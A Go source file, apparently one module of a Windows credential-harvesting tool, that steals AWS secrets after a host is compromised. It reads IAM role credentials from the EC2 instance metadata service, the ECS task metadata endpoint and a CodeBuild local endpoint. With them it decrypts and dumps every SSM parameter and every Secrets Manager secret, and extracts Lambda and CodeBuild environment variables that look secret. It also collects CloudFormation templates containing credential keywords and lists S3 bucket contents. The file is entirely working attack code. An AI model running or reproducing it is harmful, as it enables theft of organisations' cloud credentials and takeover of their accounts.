//go:build windows

package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sort"
	"strings"
	"time"
)

// ── AWS SigV4 Signer ──────────────────────────────────────────────────────────

func awsSigV4Sign(req *http.Request, body []byte, accessKey, secretKey, token, region, service string) {
	if token != "" {
		req.Header.Set("X-Amz-Security-Token", token)
	}

	now := time.Now().UTC()
	amzDate := now.Format("20060102T150405Z")
	dateStr := now.Format("20060102")
	req.Header.Set("X-Amz-Date", amzDate)

	payloadHash := sha256Hex(body)
	req.Header.Set("X-Amz-Content-Sha256", payloadHash)

	canonicalURI := req.URL.Path
	if canonicalURI == "" {
		canonicalURI = "/"
	}
	canonicalQuery := req.URL.RawQuery

	var headerNames []string
	for k := range req.Header {
		headerNames = append(headerNames, strings.ToLower(k))
	}
	sort.Strings(headerNames)

	var canonicalHeaders string
	for _, k := range headerNames {
		canonicalHeaders += k + ":" + strings.TrimSpace(req.Header.Get(k)) + "\n"
	}
	signedHeaders := strings.Join(headerNames, ";")

	canonicalReq := req.Method + "\n" + canonicalURI + "\n" + canonicalQuery + "\n" +
		canonicalHeaders + "\n" + signedHeaders + "\n" + payloadHash
	cHash := sha256Hex([]byte(canonicalReq))

	credentialScope := dateStr + "/" + region + "/" + service + "/aws4_request"
	stringToSign := "AWS4-HMAC-SHA256\n" + amzDate + "\n" + credentialScope + "\n" + cHash

	kDate := hmacSHA256([]byte("AWS4"+secretKey), []byte(dateStr))
	kRegion := hmacSHA256(kDate, []byte(region))
	kService := hmacSHA256(kRegion, []byte(service))
	kSigning := hmacSHA256(kService, []byte("aws4_request"))
	signature := hex.EncodeToString(hmacSHA256(kSigning, []byte(stringToSign)))

	authHeader := "AWS4-HMAC-SHA256 Credential=" + accessKey + "/" + credentialScope +
		", SignedHeaders=" + signedHeaders + ", Signature=" + signature
	req.Header.Set("Authorization", authHeader)
}

func sha256Hex(data []byte) string {
	h := sha256.Sum256(data)
	return hex.EncodeToString(h[:])
}

func hmacSHA256(key, data []byte) []byte {
	h := hmac.New(sha256.New, key)
	h.Write(data)
	return h.Sum(nil)
}

// ── AWS Credential Helpers ────────────────────────────────────────────────────

type awsCreds struct {
	AccessKeyID     string `json:"AccessKeyId"`
	SecretAccessKey string `json:"SecretAccessKey"`
	Token           string `json:"Token"`
	Region          string
}

func getAWSCredsFromRole(client *http.Client, roleName string) *awsCreds {
	token := getIMDSToken(client)
	if token == "" {
		return nil
	}

	credReq, _ := http.NewRequest("GET",
		fmt.Sprintf("http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", roleName), nil)
	credReq.Header.Set("X-aws-ec2-metadata-token", token)
	resp, err := client.Do(credReq)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}

	body, _ := io.ReadAll(resp.Body)
	var data struct {
		AccessKeyID     string `json:"AccessKeyId"`
		SecretAccessKey string `json:"SecretAccessKey"`
		Token           string `json:"Token"`
	}
	if json.Unmarshal(body, &data) != nil {
		return nil
	}
	return &awsCreds{
		AccessKeyID:     data.AccessKeyID,
		SecretAccessKey: data.SecretAccessKey,
		Token:           data.Token,
		Region:          getAWSRegion(client, token),
	}
}

func getIMDSToken(client *http.Client) string {
	req, _ := http.NewRequest("PUT", "http://169.254.169.254/latest/api/token", nil)
	req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return ""
	}
	body, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(body))
}

func getAWSRegion(client *http.Client, token string) string {
	req, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/placement/region", nil)
	if token != "" {
		req.Header.Set("X-aws-ec2-metadata-token", token)
	}
	resp, err := client.Do(req)
	if err != nil {
		return "us-east-1"
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	region := strings.TrimSpace(string(body))
	if region == "" {
		return "us-east-1"
	}
	return region
}

func getAWSRoleNames(client *http.Client) []string {
	token := getIMDSToken(client)
	if token == "" {
		return nil
	}
	req, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", nil)
	req.Header.Set("X-aws-ec2-metadata-token", token)
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	roles := strings.Fields(strings.ReplaceAll(strings.TrimSpace(string(body)), "\n", " "))
	return roles
}

// ── AWS API Helpers ───────────────────────────────────────────────────────────

func awsAPICall(creds *awsCreds, service, method, uri, query string, body []byte) ([]byte, error) {
	url := fmt.Sprintf("https://%s.%s.amazonaws.com%s", service, creds.Region, uri)
	if query != "" {
		url += "?" + query
	}
	req, _ := http.NewRequest(method, url, nil)
	if len(body) > 0 {
		req.Body = io.NopCloser(strings.NewReader(string(body)))
	}
	awsSigV4Sign(req, body, creds.AccessKeyID, creds.SecretAccessKey, creds.Token, creds.Region, service)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("API error %d: %s", resp.StatusCode, string(respBody))
	}
	return io.ReadAll(resp.Body)
}

func awsAPICallJSON(creds *awsCreds, service, method, uri, query string, payload, result interface{}) error {
	var body []byte
	if payload != nil {
		body, _ = json.Marshal(payload)
	}
	data, err := awsAPICall(creds, service, method, uri, query, body)
	if err != nil {
		return err
	}
	return json.Unmarshal(data, result)
}

// ── SSM Parameter Store Enumeration ───────────────────────────────────────────

func checkAWSSSM(creds *awsCreds, r *CloudTokenResult) {
	type SSMParameter struct {
		Name  string `json:"Name"`
		Type  string `json:"Type"`
		Value string `json:"Value"`
	}
	type SSMResult struct {
		Parameters []SSMParameter `json:"Parameters"`
		NextToken  string         `json:"NextToken,omitempty"`
	}

	nextToken := ""
	for page := 0; page < 5; page++ {
		payload := map[string]interface{}{
			"Path":           "/",
			"Recursive":      true,
			"WithDecryption": true,
			"MaxResults":     10,
		}
		if nextToken != "" {
			payload["NextToken"] = nextToken
		}

		var result SSMResult
		err := awsAPICallJSON(creds, "ssm", "POST", "/", "Action=GetParametersByPath&Version=2014-11-06", payload, &result)
		if err != nil {
			r.Metadata["ssm_error"] = err.Error()
			return
		}

		for _, p := range result.Parameters {
			r.Tokens = append(r.Tokens, CloudToken{
				Type:     "aws_ssm_parameter",
				Resource: fmt.Sprintf("ssm:%s", p.Name),
				Value:    fmt.Sprintf("%s=%s (%s)", p.Name, p.Value, p.Type),
			})
		}
		if result.NextToken == "" {
			break
		}
		nextToken = result.NextToken
	}
}

// ── Secrets Manager Enumeration ───────────────────────────────────────────────

func checkAWSSecretsManager(creds *awsCreds, r *CloudTokenResult) {
	type SecretEntry struct {
		Name string `json:"Name"`
		ARN  string `json:"ARN"`
	}
	type ListResult struct {
		SecretList []SecretEntry `json:"SecretList"`
		NextToken  string        `json:"NextToken,omitempty"`
	}

	var listResult ListResult
	err := awsAPICallJSON(creds, "secretsmanager", "POST", "/", "Action=ListSecrets&Version=2017-10-17", nil, &listResult)
	if err != nil {
		r.Metadata["secretsmanager_error"] = err.Error()
		return
	}

	for _, s := range listResult.SecretList {
		type GetResult struct {
			Name         string `json:"Name"`
			SecretString string `json:"SecretString"`
		}
		var getResult GetResult
		payload := map[string]string{"SecretId": s.Name}
		err := awsAPICallJSON(creds, "secretsmanager", "POST", "/", "Action=GetSecretValue&Version=2017-10-17", payload, &getResult)
		if err != nil {
			r.Metadata[fmt.Sprintf("secretsmanager_error_%s", s.Name)] = err.Error()
			continue
		}
		r.Tokens = append(r.Tokens, CloudToken{
			Type:     "aws_secretsmanager",
			Resource: fmt.Sprintf("secretsmanager:%s", getResult.Name),
			Value:    getResult.SecretString,
		})
	}
}

// ── CloudFormation Template Parsing ───────────────────────────────────────────

func checkAWSCloudFormation(creds *awsCreds, r *CloudTokenResult) {
	type StackSummary struct {
		StackName   string `json:"StackName"`
		StackStatus string `json:"StackStatus"`
	}
	type ListResult struct {
		StackSummaries []StackSummary `json:"StackSummaries"`
	}

	var listResult ListResult
	err := awsAPICallJSON(creds, "cloudformation", "POST", "/", "Action=ListStacks&Version=2010-05-15",
		map[string]interface{}{
			"StackStatusFilter": []string{"CREATE_COMPLETE", "UPDATE_COMPLETE", "ROLLBACK_COMPLETE"},
		}, &listResult)
	if err != nil {
		r.Metadata["cloudformation_error"] = err.Error()
		return
	}

	for _, stack := range listResult.StackSummaries {
		type TemplateResult struct {
			TemplateBody string `json:"TemplateBody"`
		}
		var tmpl TemplateResult
		err := awsAPICallJSON(creds, "cloudformation", "POST", "/", "Action=GetTemplate&Version=2010-05-15",
			map[string]string{"StackName": stack.StackName}, &tmpl)
		if err != nil {
			continue
		}

		// Scan template for hardcoded credentials
		tmplLower := strings.ToLower(tmpl.TemplateBody)
		credIndicators := []string{"awsaccesskey", "awssecretkey", "password", "secret", "connectionstring"}
		for _, ind := range credIndicators {
			if strings.Contains(tmplLower, ind) {
				r.Tokens = append(r.Tokens, CloudToken{
					Type:     "aws_cloudformation_template",
					Resource: fmt.Sprintf("cloudformation:%s", stack.StackName),
					Value:    fmt.Sprintf("Stack=%s (status=%s)\n%s", stack.StackName, stack.StackStatus, tmpl.TemplateBody),
				})
				break
			}
		}
	}
}

// ── Lambda Environment Extraction ─────────────────────────────────────────────

func checkAWSLambda(creds *awsCreds, r *CloudTokenResult) {
	type FunctionEntry struct {
		FunctionName string `json:"FunctionName"`
	}
	type ListResult struct {
		Functions []FunctionEntry `json:"Functions"`
	}

	var listResult ListResult
	err := awsAPICallJSON(creds, "lambda", "GET", "/2015-03-31/functions/", "", nil, &listResult)
	if err != nil {
		r.Metadata["lambda_error"] = err.Error()
		return
	}

	for _, fn := range listResult.Functions {
		type ConfigResult struct {
			FunctionName string `json:"FunctionName"`
			Environment  *struct {
				Variables map[string]string `json:"Variables"`
			} `json:"Environment"`
		}
		var cfg ConfigResult
		err := awsAPICallJSON(creds, "lambda", "GET",
			fmt.Sprintf("/2015-03-31/functions/%s", fn.FunctionName), "", nil, &cfg)
		if err != nil {
			continue
		}
		if cfg.Environment != nil && len(cfg.Environment.Variables) > 0 {
			envVars, _ := json.Marshal(cfg.Environment.Variables)
			r.Tokens = append(r.Tokens, CloudToken{
				Type:     "aws_lambda_env",
				Resource: fmt.Sprintf("lambda:%s", cfg.FunctionName),
				Value:    string(envVars),
			})
		}
	}
}

// ── ECS Task Metadata ─────────────────────────────────────────────────────────

func checkAWSECS(r *CloudTokenResult) {
	client := &http.Client{Timeout: 3 * time.Second}

	// ECS task metadata endpoint (v2)
	urls := []string{
		"http://169.254.170.2/v2/credentials",
		"http://169.254.170.2/v2/metadata",
		"http://169.254.170.2/v3/credentials",
	}
	for _, url := range urls {
		resp, err := client.Get(url)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 200 {
			r.Metadata[fmt.Sprintf("ecs_%s", url)] = string(body)

			// Parse credentials from ECS
			var credData map[string]interface{}
			if json.Unmarshal(body, &credData) == nil {
				if ak, ok := credData["AccessKeyId"].(string); ok {
					r.Tokens = append(r.Tokens, CloudToken{Type: "aws_ecs_access_key", Resource: "ecs", Value: ak})
				}
				if sk, ok := credData["SecretAccessKey"].(string); ok {
					r.Tokens = append(r.Tokens, CloudToken{Type: "aws_ecs_secret_key", Resource: "ecs", Value: sk})
				}
				if tok, ok := credData["Token"].(string); ok {
					r.Tokens = append(r.Tokens, CloudToken{Type: "aws_ecs_token", Resource: "ecs", Value: tok})
				}
			}
		}
	}
}

// ── CodeBuild Credential Extraction ───────────────────────────────────────────

func checkAWSCodeBuild(creds *awsCreds, r *CloudTokenResult) {
	// In CodeBuild environments, creds are also available via metadata endpoint
	client := &http.Client{Timeout: 3 * time.Second}

	// CodeBuild credential helper endpoint
	resp, err := client.Get("http://localhost:5678/v1/credentials")
	if err == nil {
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		if resp.StatusCode == 200 {
			r.Tokens = append(r.Tokens, CloudToken{
				Type:     "aws_codebuild_creds",
				Resource: "codebuild:localhost:5678",
				Value:    string(body),
			})
		}
	}

	// List CodeBuild projects
	type ProjectEntry struct {
		Name string `json:"name"`
	}
	type ListResult struct {
		Projects []string `json:"projects"`
	}

	var listResult ListResult
	err = awsAPICallJSON(creds, "codebuild", "POST", "/", "Action=ListProjects&Version=2016-10-06", nil, &listResult)
	if err != nil {
		return
	}

	for _, proj := range listResult.Projects {
		type BuildResult struct {
			Builds []struct {
				Environment struct {
					EnvironmentVariables []struct {
						Name  string `json:"name"`
						Value string `json:"value"`
						Type  string `json:"type"`
					} `json:"environmentVariables"`
				} `json:"environment"`
			} `json:"builds"`
		}
		var br BuildResult
		err := awsAPICallJSON(creds, "codebuild", "POST", "/", "Action=BatchGetBuilds&Version=2016-10-06",
			map[string]interface{}{"ids": []string{proj}}, &br)
		if err != nil {
			continue
		}
		for _, b := range br.Builds {
			for _, ev := range b.Environment.EnvironmentVariables {
				if strings.Contains(strings.ToLower(ev.Name), "secret") ||
					strings.Contains(strings.ToLower(ev.Name), "password") ||
					strings.Contains(strings.ToLower(ev.Name), "key") ||
					strings.Contains(strings.ToLower(ev.Name), "token") {
					r.Tokens = append(r.Tokens, CloudToken{
						Type:     "aws_codebuild_env",
						Resource: fmt.Sprintf("codebuild:%s", proj),
						Value:    fmt.Sprintf("%s=%s", ev.Name, ev.Value),
					})
				}
			}
		}
	}
}

// ── S3 Bucket Listing ─────────────────────────────────────────────────────────

func checkAWSS3(creds *awsCreds, r *CloudTokenResult) {
	type S3Result struct {
		Buckets []struct {
			Name         string `json:"Name"`
			CreationDate string `json:"CreationDate"`
		} `json:"Buckets"`
	}

	var result S3Result
	err := awsAPICallJSON(creds, "s3", "GET", "/", "", nil, &result)
	if err != nil {
		r.Metadata["s3_error"] = err.Error()
		return
	}

	for _, b := range result.Buckets {
		r.Tokens = append(r.Tokens, CloudToken{
			Type:     "aws_s3_bucket",
			Resource: fmt.Sprintf("s3://%s", b.Name),
			Value:    fmt.Sprintf("Name=%s, Created=%s", b.Name, b.CreationDate),
		})

		// Try to list first 100 objects in each bucket
		type ListObjectsResult struct {
			Contents []struct {
				Key  string `json:"Key"`
				Size int64  `json:"Size"`
			} `json:"Contents"`
		}
		var objects ListObjectsResult
		err := awsAPICallJSON(creds, "s3", "GET", fmt.Sprintf("/%s", b.Name), "max-keys=5", nil, &objects)
		if err == nil && len(objects.Contents) > 0 {
			var keys []string
			for _, obj := range objects.Contents {
				keys = append(keys, fmt.Sprintf("%s (%d bytes)", obj.Key, obj.Size))
			}
			r.Metadata[fmt.Sprintf("s3_objects_%s", b.Name)] = strings.Join(keys, ", ")
		}
	}
}

// ── AWS Main Entry Point ──────────────────────────────────────────────────────

func checkAWSAll(client *http.Client, r *CloudTokenResult) {
	// Get IAM role name(s)
	roles := getAWSRoleNames(client)
	r.RoleNames = roles

	// Basic IMDS checks (already done in caller, but ensure we have region)
	if r.Region == "" {
		token := getIMDSToken(client)
		r.Region = getAWSRegion(client, token)
	}

	if len(roles) == 0 {
		r.Metadata["aws_note"] = "No IAM roles attached to instance"
		return
	}

	for _, role := range roles {
		creds := getAWSCredsFromRole(client, role)
		if creds == nil {
			continue
		}

		r.Metadata["aws_iam_role"] = role

		// SSM Parameter Store
		checkAWSSSM(creds, r)

		// Secrets Manager
		checkAWSSecretsManager(creds, r)

		// CloudFormation
		checkAWSCloudFormation(creds, r)

		// Lambda
		checkAWSLambda(creds, r)

		// CodeBuild
		checkAWSCodeBuild(creds, r)

		// S3
		checkAWSS3(creds, r)

		// Only check the first role
		break
	}

	// ECS (doesn't need role creds)
	checkAWSECS(r)
}
